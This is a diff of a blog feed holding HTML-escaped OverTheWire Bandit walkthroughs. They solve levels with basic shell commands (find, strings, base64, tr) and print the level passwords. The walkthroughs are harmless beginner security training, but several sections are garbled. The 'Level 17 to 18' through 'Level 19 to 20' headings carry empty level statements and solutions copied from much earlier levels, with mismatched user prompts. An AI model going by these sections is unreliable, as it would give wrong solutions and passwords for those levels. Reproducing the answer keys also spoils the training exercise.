+&lt;span class=&quot;nt&quot;&gt;-file00&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file01&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file02&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file03&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file04&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file05&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file06&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file07&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file08&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file09&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We know we have to find file who’s content is in Human Readable format. This check can be performed using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command. File command returns the type of data that is found in the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file ./&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+./-file00: data
+./-file01: data
+./-file02: data
+./-file03: data
+./-file04: data
+./-file05: data
+./-file06: data
+./-file07: ASCII text
+./-file08: data
+./-file09: data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-file07&lt;/code&gt; file using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;
+
+&lt;h2 id=&quot;level-17-to-level-18&quot;&gt;Level 17 to Level 18&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-2&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;**&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-2&quot;&gt;COMMANDS&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cd     - change working directory.&lt;/em&gt;
+                                                                                                                                                                           &amp;gt;
+&lt;em&gt;cat    - concatenate files and print on the standard output.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;file   - determine file type.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;du     - estimate file space usage.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;find   - search for files in a directory hierarchy.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;solution-2&quot;&gt;SOLUTION&lt;/h2&gt;
+
+&lt;p&gt;View files that are in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inhere&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+bandit5@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;inhere/
+bandit5@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;maybehere00  maybehere03  maybehere06  maybehere09  maybehere12  maybehere15  maybehere18
+maybehere01  maybehere04  maybehere07  maybehere10  maybehere13  maybehere16  maybehere19
+maybehere02  maybehere05  maybehere08  maybehere11  maybehere14  maybehere17
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To search for the file that we require using the properties that are specified in the question we can make use of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-size&lt;/span&gt; 1033c &lt;span class=&quot;nt&quot;&gt;-not&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-executable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; file &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; + | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;ASCII
+./maybehere07/.file2: ASCII text, with very long lines
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;h3 id=&quot;command-explanation&quot;&gt;Command Explanation&lt;/h3&gt;
+  &lt;ul&gt;
+    &lt;li&gt;. : Search the current working directory only&lt;/li&gt;
+    &lt;li&gt;-type f : Look for files only (Exclude Directories)&lt;/li&gt;
+    &lt;li&gt;-size 1033c : Look for files that are exactly 1033 bytes in size (Find uses “c” to represent bytes)&lt;/li&gt;
+    &lt;li&gt;-not -executable : Find only non executable files&lt;/li&gt;
+    &lt;li&gt;-exec file {} + : Execute the file command on all the results returns by find&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; {} is an placeholder for the location where the names of the files found by find is going to be substituted. The “+” sign is used to terminate the statemen.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;From the previous level we know that file command will return value “ASCII Text” for human readable files. So by using grep we are filtering the output to only show results with that contain that string. 
+The pipe (|) operator is used to pass the output of one command as the input of another command. 
+Finally we print the content of the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit," /><category term="bash" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit (9 to 12)</title><link href="http://localhost:4000/bandit-9-to-12/" rel="alternate" type="text/html" title="Bandit (9 to 12)" /><published>2022-07-15T00:00:00+02:00</published><updated>2022-07-15T00:00:00+02:00</updated><id>http://localhost:4000/bandit-9-to-12</id><content type="html" xml:base="http://localhost:4000/bandit-9-to-12/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;level-9-to-level-10&quot;&gt;Level 9 to Level 10&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-you-may-need&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;grep   - print lines that match patterns&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;sort   - sort lines of text files&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;uniq   - report or omit repeated lines&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;strings- print the sequence of printable characters in files&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;base64 - print the sequence of printable characters in files&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;tr     - translate or delete characters&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;tar    - an archiving utility&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;gzip   - compress or expand files&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;bzip2  - a block-sorting file compressor&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;xxd    - make a hexdump or do the reverse&lt;/em&gt;&lt;/p&gt;
+  &lt;h3 id=&quot;solution&quot;&gt;SOLUTION&lt;/h3&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;View the contents of the current working directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;data.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Check out the data that is present in the file. This can be achieved using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;head&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 4 data.txt
+�L�lω&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;��ßOܛ��ǤX��NdT&lt;span class=&quot;nv&quot;&gt;$�&lt;/span&gt;�x7��@D@�o��+D��B��M֢�Z/,_��w��#�5���
+                                                              Ў�e�&amp;amp;�-��Ϣ�6Q8��J�%fa�
+�np�6l
+|c���WW&lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;8��f��
+��VJ�&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$�&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;S~����d�
+                 �p�k�U�;ֿ�v�Am��H��tɘ�3�ߘ�(ǟ�E'
+                                                     ���'��:��uP�ע���������g� 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Human readable string in a file can be found using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; command.
+The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; flag is used to specify the character encoding. We are assuming the human readable line is ASCII so we use “s” for the encoding type.&lt;/p&gt;
+
+&lt;p&gt;We also know that the line with the password starts with a few “=” characters. We can look for this pattern in the file using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; command. We can combine all these commands into a single line using the pipe operator.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit9@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | strings &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; s | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;==========&lt;/span&gt; the&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;2i&lt;span class=&quot;s2&quot;&gt;&quot;4
+========== password
+Z)========== is
+&amp;amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;
+
+&lt;h2 id=&quot;level-10-to-level-11&quot;&gt;Level 10 to Level 11&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-1&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the file data.txt, which contains base64 encoded data.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-you-may-need-1&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Same commands as level 10.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;View the contents of the current working directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit10@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;data.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Check out the data that is in the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit10@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt
+&lt;span class=&quot;nv&quot;&gt;VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Looking at the content it looks like an string of random characters but from the question we know that the data is base64 encoded. We can decode this data using the base64 command that is present on unix systems. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d&lt;/code&gt; flag is used to decode the data.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit10@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;
+
+&lt;h2 id=&quot;level-11-to-level-12&quot;&gt;Level 11 to Level 12&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-2&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-you-may-need-2&quot;&gt;COMMANDS YOU MAY NEED&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;Same commands as level 10.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;solution-2&quot;&gt;SOLUTION&lt;/h2&gt;
+
+&lt;p&gt;View the contents of the current working directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit11@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;data.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Check out the data that is present in the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit11@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt
+Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We know that the characters in the data are rotated by 13 characters. We can get the characters to its original order using the tr command. The tr command is used to translate/ transform data from one form to another.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit11@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;data.txt | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'A-Za-z'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'N-ZA-Mn-za-m'&lt;/span&gt;
+The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="OverTheWire" /><category term="bandit," /><category term="bash" /><summary type="html">https://overthewire.org/wargames/bandit/</summary></entry><entry><title type="html">Bandit (18 to 21)</title><link href="http://localhost:4000/bandit-18-to-21/" rel="alternate" type="text/html" title="Bandit (18 to 21)" /><published>2022-07-15T00:00:00+02:00</published><updated>2022-07-15T00:00:00+02:00</updated><id>http://localhost:4000/bandit-18-to-21</id><content type="html" xml:base="http://localhost:4000/bandit-18-to-21/">&lt;p&gt;&lt;img src=&quot;../assets/images/overthewire.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;level-18-to-level-19&quot;&gt;Level 18 to Level 19&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;**&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands&quot;&gt;COMMANDS&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cd     - change working directory.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cat    - concatenate files and print on the standard output.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;file   - determine file type.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;du     - estimate file space usage.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;find   - search for files in a directory hierarchy.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;View the files that are present in the current working directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Move into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inhere/&lt;/code&gt; directory. This can be done using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; command&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;inhere/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View files that are in the directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. Since we know the file is hidden we have to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; flag to view hidden files.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+..
+.hidden
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.hidden&lt;/code&gt; file using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;
+
+&lt;h2 id=&quot;level-19-to-level-20&quot;&gt;Level 19 to Level 20&lt;/h2&gt;
+
+&lt;h3 id=&quot;the-levels-statement-1&quot;&gt;THE LEVEL’S STATEMENT&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;**
+**&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;commands-1&quot;&gt;COMMANDS&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;ls     - list directory contents.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;cd     - change working directory.&lt;/em&gt;
+                                                                                                                                                                           &amp;gt;
+&lt;em&gt;cat    - concatenate files and print on the standard output.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;file   - determine file type.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;du     - estimate file space usage.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;find   - search for files in a directory hierarchy.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;SOLUTION&lt;/h3&gt;
+
+&lt;p&gt;View the files that are present in the current working directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. Next move into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inhere/&lt;/code&gt; directory. This can be done using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+
+bandit4@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;inhere/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View files that are in the directory using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-file00&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file01&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file02&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file03&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file04&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file05&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file06&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file07&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file08&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-file09&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We know we have to find file who’s content is in Human Readable format. This check can be performed using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command. File command returns the type of data that is found in the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file ./&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+./-file00: data
+./-file01: data
+./-file02: data
+./-file03: data
+./-file04: data
+./-file05: data
+./-file06: data
+./-file07: ASCII text
+./-file08: data
+./-file09: data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;View the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-file07&lt;/code&gt; file using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We have found the password for the next level!&lt;/p&gt;
+
